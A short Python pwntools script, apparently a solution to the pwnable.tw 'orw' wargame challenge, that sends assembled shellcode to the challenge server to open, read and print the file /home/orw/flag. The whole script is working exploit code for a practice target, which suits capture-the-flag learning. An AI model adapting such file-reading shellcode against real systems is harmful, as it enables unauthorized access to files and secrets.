from pwn import *

conn = remote('chall.pwnable.tw', 10001)
filename='/home/orw/flag\0'

shellcode = ''
shellcode += shellcraft.open(filename)
shellcode += shellcraft.read('eax', 'esp', 100)     #read 100 bytes to buf which is [rsp]
shellcode += shellcraft.write(1, 'esp', 100)        #output buf

conn.recvuntil('shellcode:')
conn.send(asm(shellcode))

log.success(conn.recvline())